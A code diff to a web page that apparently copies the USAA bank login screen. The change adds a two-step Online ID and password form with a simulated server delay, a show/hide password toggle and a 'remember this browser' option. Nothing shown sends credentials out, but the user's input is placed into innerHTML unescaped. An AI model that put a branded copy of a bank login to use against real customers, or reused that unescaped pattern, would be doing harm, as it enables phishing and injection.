@@ -205,29 +205,56 @@
     <a href="#" class="footer-link">Accessibility at USAA</a>
   </footer>
 
-  <script>
-    const nextButton = document.getElementById('next-button');
-    const loginForm = document.getElementById('login-form');
+ <script>
+  const nextButton = document.getElementById('next-button');
+  const loginForm = document.getElementById('login-form');
 
-    nextButton.addEventListener('click', () => {
-      // Clear existing form and show spinner
-      loginForm.innerHTML = '<div class="spinner"></div>';
+  nextButton.addEventListener('click', () => {
+    // Get the current Online ID value
+    const onlineId = document.getElementById('online-id').value;
 
-      // Simulate a delay for server response
-      setTimeout(() => {
-        // Replace spinner with password form
-        loginForm.innerHTML = `
-          <label for="online-id">Online ID</label>
-          <input type="text" id="online-id" value="${document.getElementById('online-id').value}" readonly>
-          <label for="password">Password</label>
-          <div style="display: flex; align-items: center;">
-            <input type="password" id="password" placeholder="Enter Password" style="flex: 1;">
-            <a href="#" style="margin-left: 10px; color: #0056b3; text-decoration: none;">Show</a>
-          </div>
-          <button type="button">Next</button>
-        `;
-      }, 2000); // 2-second delay for spinner
-    });
-  </script>
+    if (!onlineId) {
+      alert("Please enter your Online ID."); // Simple validation
+      return;
+    }
+
+    // Clear existing form and show spinner
+    loginForm.innerHTML = '<div class="spinner"></div>';
+
+    // Simulate a delay for server response
+    setTimeout(() => {
+      // Replace spinner with password form
+      loginForm.innerHTML = `
+        <label for="online-id">Online ID</label>
+        <input type="text" id="online-id" value="${onlineId}" readonly>
+        <label for="password">Password</label>
+        <div style="display: flex; align-items: center;">
+          <input type="password" id="password" placeholder="Enter Password" style="flex: 1;">
+          <a href="#" id="toggle-password" style="margin-left: 10px; color: #0056b3; text-decoration: none;">Show</a>
+        </div>
+        <div style="margin-top: 10px; text-align: left;">
+          <input type="checkbox" id="remember-browser">
+          <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
+        </div>
+        <button type="button" id="login-button">Next</button>
+      `;
+
+      // Add functionality to toggle password visibility
+      const togglePassword = document.getElementById('toggle-password');
+      const passwordInput = document.getElementById('password');
+
+      togglePassword.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          togglePassword.textContent = 'Hide';
+        } else {
+          passwordInput.type = 'password';
+          togglePassword.textContent = 'Show';
+        }
+      });
+    }, 2000); // 2-second delay for spinner
+  });
+</script>
 </body>
 </html>
